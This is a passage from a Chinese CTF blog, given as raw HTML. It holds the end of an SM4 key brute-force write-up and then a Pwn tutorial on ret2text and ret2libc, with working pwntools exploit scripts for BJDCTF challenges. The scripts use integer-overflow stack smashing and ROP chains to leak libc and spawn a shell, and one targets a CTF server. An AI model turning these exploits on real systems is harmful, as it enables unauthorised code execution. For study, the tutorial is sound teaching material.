func  </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom  </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG, secret_message  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key, plaintext, iv</span>):  </span><br><span class="line">    cipher = sm4.CryptSM4(sm4.SM4_ENCRYPT, <span class="number">0</span>)  </span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)  </span><br><span class="line">    ciphertext = cipher.crypt_cbc(iv,plaintext)  </span><br><span class="line">    <span class="keyword">return</span> ciphertext  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    key = secret_message  </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) &lt; <span class="number">16</span>:  </span><br><span class="line">        key += secret_message  </span><br><span class="line">    key = key[:<span class="number">16</span>]  </span><br><span class="line">    iv = urandom(<span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">    plaintext = <span class="string">b&quot;My FLAG? If you want it, I&#x27;ll let you have it... search for it! I left all of it at that place: &quot;</span> + FLAG  </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plaintext) % <span class="number">16</span> == <span class="number">0</span>, <span class="string">&quot;The message must be a multiple of 16 bytes.&quot;</span>  </span><br><span class="line">    ciphertext = encrypt(key, plaintext, iv)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Ciphertext: <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;What is this: <span class="subst">&#123;xor(key, iv).<span class="built_in">hex</span>()&#125;</span>&quot;</span>)  </span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>只给了加密后的flag和<span class="math inline">\(key\oplus iv\)</span>，似乎没有任何切入点，但是看<code>key</code>的生成逻辑可以看到它是<code>secret_message</code>重复多遍得到的，猜测<code>secret_message</code>可能很短，所以考虑爆破，而且给出了一大段明文，可以通过这段明文来判断得到的<code>secret_message</code>是否正确： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4, func  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor  </span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key, ciphertext, iv</span>):  </span><br><span class="line">    cipher = sm4.CryptSM4(sm4.SM4_ENCRYPT, <span class="number">0</span>)  </span><br><span class="line">    cipher.set_key(key, sm4.SM4_DECRYPT)  </span><br><span class="line">    plaintext = cipher.crypt_cbc(iv, ciphertext)  </span><br><span class="line">    <span class="keyword">return</span> plaintext  </span><br><span class="line">  </span><br><span class="line">c = <span class="string">&quot;d9ea43b0d208aa168e4a275a69df3bc86051e756f9ca7959b68c6b23c9e1b69c19e08b75938375a6be830d1844d8a6e368faf1ddffecea69b5abe00ac0d6e10d6696be33d40e83a272072fbe131f98c82587011f61f2d58a020c8c54cf9b651abd740a3d55d36daa9c88cfc10a520ce4211fba4365ce98b82355b17c64dd2de4800fc68df36cfa8a3fd05baac6970dcd&quot;</span>  </span><br><span class="line">h = <span class="string">&quot;ee278c4e526ff15b8d308b6b18f83221&quot;</span>  </span><br><span class="line">head = <span class="string">b&quot;My FLAG? If you want it, I&#x27;ll let you have it... search for it! I left all of it at that place: &quot;</span>  </span><br><span class="line">  </span><br><span class="line">key_xor_iv = <span class="built_in">bytes</span>.fromhex(h)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):  </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(product(ascii_letters + digits, repeat=l)):  </span><br><span class="line">        secret_message = <span class="string">&#x27;&#x27;</span>.join(s).encode()  </span><br><span class="line">        key = secret_message  </span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(key) &lt; <span class="number">16</span>:  </span><br><span class="line">            key += secret_message  </span><br><span class="line">        key = key[:<span class="number">16</span>]  </span><br><span class="line">        iv = xor(key_xor_iv, key)  </span><br><span class="line">        ciphertext = <span class="built_in">bytes</span>.fromhex(c)  </span><br><span class="line">        pt = decrypt(key, ciphertext, iv)  </span><br><span class="line">        <span class="keyword">if</span> head <span class="keyword">in</span> pt:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Secret message: <span class="subst">&#123;secret_message&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(pt)  </span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn笔记(1) ret2系列</title>
      <link href="/2025/04/29/Pwn%E7%AC%94%E8%AE%B0-1-ret2%E7%B3%BB%E5%88%97/"/>
      <url>/2025/04/29/Pwn%E7%AC%94%E8%AE%B0-1-ret2%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>想了一下，还是把之前学的一点Pwn放上来吧，本文的例题都是64位的程序，这些技术在32位程序上实际上也是类似的</p></blockquote><h2 id="ret2text">ret2text</h2><p>ret2text是控制程序执行程序本身已经有的代码（即<code>.text</code>段的代码），在控制程序执行代码的时候也可以执行几段不连续的已有代码（即gadgets），这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h4 id="例bjdctf-2020babystack2.0">例：[BJDCTF 2020]babystack2.0</h4><p>题目：<a href="https://www.nssctf.cn/problem/709">BJDCTF 2020-babystack2.0 | NSSCTF</a></p><p>checksec可以知道： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure> 没有Canary和PIE，但是存在NX保护.</p><p>用IDA打开附件，可以看到：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到如下栈，我们的目的是返回地址（也就是IDA变量栈中标注<code>r</code>的地方，那里实际上是<code>main</code>的返回地址） <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">-0000000000000010</span> buf             db <span class="number">12</span> dup(?)</span><br><span class="line"><span class="number">-0000000000000004</span> nbytes          dq ?</span><br><span class="line">+<span class="number">0000000000000004</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000005</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000006</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000007</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000008</span>  r              db <span class="number">8</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000010</span></span><br><span class="line">+<span class="number">0000000000000010</span> ; end of <span class="built_in">stack</span> variables</span><br></pre></td></tr></table></figure> 同时程序提供了一个后门： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 我们需要先输入一个<code>int</code>类型的<code>nbytes&lt;10</code>，再输入对应长度的字符串<code>buf</code>（若超出<code>nbytes</code>的长度将无法读入，若<code>nbytes</code>为符合条件的正数，我们并不能通过<code>buf</code>来利用栈溢出漏洞），但是问题在于<code>read(0, buf, (unsigned int)nbytes);</code>处，<code>nbytes</code>会被转换成<code>usigned int</code>，显然我们可以输入-1让<code>nbytes</code>在转换的时候溢出，解除<code>read</code>的长度限制，从而达到通过<code>buf</code>实现栈溢出的效果。 查看汇编：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400726                 public backdoor</span><br><span class="line">.text:0000000000400726 backdoor        proc near</span><br><span class="line">.text:0000000000400726 ; __unwind &#123;</span><br><span class="line">.text:0000000000400726                 push    rbp</span><br><span class="line">.text:0000000000400727                 mov     rbp, rsp</span><br><span class="line">.text:000000000040072A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040072F                 call    _system</span><br><span class="line">.text:0000000000400734                 mov     eax, 1</span><br><span class="line">.text:0000000000400739                 pop     rbp</span><br><span class="line">.text:000000000040073A                 retn</span><br><span class="line">.text:000000000040073A ; &#125; // starts at 400726</span><br><span class="line">.text:000000000040073A backdoor        endp</span><br></pre></td></tr></table></figure><p>看到<code>backdoor</code>函数的起始地址为0x400726，可以写出代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>, port)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;-1&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x400726</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="ret2libc">ret2libc</h2><p>ret2libc 即控制动态链接编译的程序执行 libc 中的函数，通常是返回至某个函数（通常是<code>puts</code>函数）的 plt 表地址或者函数的具体位置 (即函数对应的 got 表项的内容)，一般情况下会选择劫持程序执行 <code>system(&quot;/bin/sh&quot;)</code>，故而此时我们需要知道 <code>system</code>函数的地址和<code>/bin/sh</code>的地址。 在Linux下，动态链接是通过plt和got来实现的，调用动态链接函数时会先去plt表和got表中寻找该函数的真实地址，plt表会指向got表中的地址，got表指向libc中的地址，所以在程序运行时：<strong>got表会包含函数的真实地址（即libc基址+函数相对libc的偏移）</strong>，而我们可以通过plt表来直接调用函数。</p><p>利用ret2libc劫持程序一般有一个溢出点，要进行两次劫持：</p><ol type="1"><li>第一次劫持：要劫持程序泄露出某个函数的地址（例如<code>puts</code>,<code>write</code>等），从而计算出libc的基址</li><li>第二次劫持：控制程序通过上面获得的libc基址，通过libc中<code>system</code>函数以及<code>/bin/sh</code>的偏移来执行<code>system(&quot;/bin/sh&quot;)</code>来获得shell</li></ol><p>在第一次劫持中，我们一般要构造出通过输出函数（例如<code>puts</code>,<code>write</code>,<code>printf</code>）来输出待泄露函数的真实地址，从而计算出libc的基址，计算方法为：</p><blockquote><p>lib基址=函数真实地址-该函数相对libc基址的偏移量（即该函数在libc中的地址）</p></blockquote><p>下面以64位程序为基础，对通过<code>puts</code>函数和<code>write</code>函数进行函数真实地址泄露进行讲解：</p><h3 id="puts函数"><code>puts</code>函数</h3><p><code>puts</code>函数只有一个参数，这个参数所使用的寄存器为<code>rdi</code>寄存器：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121923820.png" alt="Pasted image 20241111214941" /><figcaption>Pasted image 20241111214941</figcaption></figure><p>为使用<code>puts</code>函数时，我们只需要通过<code>pop rdi</code>将参数从栈顶弹出到<code>rdi</code>寄存器中再调用<code>puts</code>函数进行输出即可，在ret2libc中，我们一般会在栈溢出后构造如下rop链：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop_rdi→目标函数的got表地址→puts的plt表地址→要回到的函数地址（一般是main函数）</span><br></pre></td></tr></table></figure><blockquote><p>注：<code>pop rdi</code>一般会存在于<code>__libc_csu_init</code>之中，为<code>pop r15</code>（<code>41 5F</code>）的后半部分（<code>5F</code>）</p></blockquote><p>这样之后，我们就可以读取到目标函数的真实地址，而在64位程序中，目标函数真实地址一般由<code>7f</code>开头且占8个字节，而在32位程序中，目标函数的真实地址一般以<code>f7</code>开头且占4个字节，那么在本题中我们可以通过下面这条语句来读出函数的真实地址：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br></pre></td></tr></table></figure><p>泄露出真实地址后，我们就可以通过<code>LibcSearcher</code>库或者<a href="https://libc.rip/">libc-database</a>来找到对应的libc版本（除非题目给了），从而计算出libc的基地址，然后就可以构造出<code>system(&quot;/bin/sh&quot;)</code>来获取shell了。</p><h4 id="例bjdctf-2020babyrop">例：[BJDCTF 2020]babyrop</h4><p>题目：<a href="https://www.nssctf.cn/problem/707">BJDCTF 2020-babyrop | NSSCTF</a></p><p>通过IDA打开程序可以看见：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121930749.png" alt="Pasted image 20241111222159" /><figcaption>Pasted image 20241111222159</figcaption></figure><p>这里并没有<code>system</code>函数，checksec可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121932934.png" alt="Pasted image 20241111222334" /><figcaption>Pasted image 20241111222334</figcaption></figure><p>发现既没有Canary也没有PIE保护，所以判断需要通过ret2libc来获取shell，可以看到<code>vuln</code>函数内容为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显<code>read</code>函数存在溢出，那么我们可以通过如下代码来构造payload来泄露<code>puts</code>函数的真实地址： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">pop_rdi = <span class="number">0x400733</span>  </span><br><span class="line">ret = <span class="number">0x4004c9</span>  </span><br><span class="line">vuln = <span class="number">0x40067D</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br></pre></td></tr></table></figure> 在获取<code>puts</code>的真实地址之后，我们就可以通过<code>LibcSearcher</code>来找到所有可能的libc版本（可能要多试几遍），或者我们可以通过泄露多个函数的真实地址来使用<a href="https://libc.rip/">libc-database</a>确定libc的版本：</p><h5 id="通过libcsearcher来找到libc版本">通过LibcSearcher来找到libc版本</h5><p>可以写出代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>, port)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">pop_rdi = <span class="number">0x400733</span>  </span><br><span class="line">ret = <span class="number">0x4004c9</span>  </span><br><span class="line">vuln = <span class="number">0x40067D</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">puts_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The real address of puts is&quot;</span>, <span class="built_in">hex</span>(puts_real))  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_real)  </span><br><span class="line">libc_base = puts_real - libc.dump(<span class="string">&quot;puts&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The base address of libc is&quot;</span>, <span class="built_in">hex</span>(libc_base))  </span><br><span class="line">  </span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)  </span><br><span class="line">sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(sh) + p64(system) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure> 多次尝试之后可以发现正确的版本为<code>libc6_2.23-0ubuntu10_amd64</code>，在进行如下交互之后我们就可以获得shell了：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121939838.png" alt="Pasted image 20241111223428" /><figcaption>Pasted image 20241111223428</figcaption></figure><h5 id="通过libc-database确定libc版本">通过<a href="https://libc.rip/">libc-database</a>确定libc版本</h5><p>我们可以通过如下代码来输出<code>puts</code>和<code>read</code>的真实地址： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>, port)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">pop_rdi = <span class="number">0x400733</span>  </span><br><span class="line">ret = <span class="number">0x4004c9</span>  </span><br><span class="line">vuln = <span class="number">0x40067D</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">puts_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The real address of puts is&quot;</span>, <span class="built_in">hex</span>(puts_real))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">read_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The real address of read is&quot;</span>, <span class="built_in">hex</span>(read_real))</span><br></pre></td></tr></table></figure> 得到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121943492.png" alt="Pasted image 20241111223802" /><figcaption>Pasted image 20241111223802</figcaption></figure><p>（值得注意的是，由于<code>libc</code>每一次运行的基址都是不一样的，所以每一次运行得到的结果都不同)，那么我们可以通过在libc-database中进行如下操作找到两个<code>libc</code>版本：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121946369.png" alt="Pasted image 20241111223936" /><figcaption>Pasted image 20241111223936</figcaption></figure><p>我们可以看到对于这两个libc版本关键内容如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121950826.png" alt="Pasted image 20241111224157" /><figcaption>Pasted image 20241111224157</figcaption></figure><p>对比发现关键内容均一致（特别是我们关心的<code>system</code>函数和<code>/bin/sh</code>字符串)</p><p>我们任选一个下载，之后通过如下代码就可以得到shell了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="number">28516</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn (8)&quot;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">pop_rdi = <span class="number">0x400733</span>  </span><br><span class="line">ret = <span class="number">0x4004c9</span>  </span><br><span class="line">vuln = <span class="number">0x40067D</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">puts_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The real address of puts is&quot;</span>, <span class="built_in">hex</span>(puts_real))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">read_real = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The real address of read is&quot;</span>, <span class="built_in">hex</span>(read_real))  </span><br><span class="line">  </span><br><span class="line">libc_base = puts_real - libc.sym[<span class="string">&quot;puts&quot;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The base address of libc is&quot;</span>, <span class="built_in">hex</span>(libc_base))  </span><br><span class="line">  </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]  </span><br><span class="line">sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(sh) + p64(system) + p64(vuln)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Pull up your sword and tell me u story!&quot;</span>, payload)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="write函数"><code>write</code>函数</h3><p><code>write</code>函数有三个参数，这三个参数分别使用<code>rdi</code>，<code>rsi</code>和<code>rdx</code>三个寄存器，分别存储文件描述符<code>fd</code>（通常设置为1表示输出流），要输出的数据<code>buf</code>以及输出长度<code>n</code></p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121955234.png" alt="Pasted image 20241111225009" /><figcaption>Pasted image 20241111225009</figcaption></figure><p>在一般情况下，程序中并不会刚刚好同时包含<code>pop rdi; retn</code>，<code>pop rsi; retn</code>以及<code>pop rdx; retn</code>这三条语句，这种时候就要我们通过<a href="#%20ret2csu">ret2csu</a>技术来控制寄存器存入我们想要的值来获取目标函数的真实地址。</p><h4 id="例hnctf-2022-week2ret2csu">例：[HNCTF 2022 WEEK2]ret2csu</h4><p>题目：<a href="https://www.nssctf.cn/problem/2963">HNCTF 2022 WEEK2-ret2csu | NSSCTF</a></p><p>checksec可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121956633.png" alt="Pasted image 20241112125444" /><figcaption>Pasted image 20241112125444</figcaption></figure><p>没有任何保护，所以可以通过ret2libc来获取shell，观察函数表：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430121958324.png" alt="Pasted image 20241112125551" /><figcaption>Pasted image 20241112125551</figcaption></figure><p>发现没有<code>puts</code>函数，只有<code>write</code>函数，所以我们要考虑用<code>write</code>函数来泄露<code>libc</code>基址，查找<code>pop rdi</code>，<code>pop rsi</code>以及<code>pop rdx</code>可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122000101.png" alt="Pasted image 20241112125825" /><figcaption>Pasted image 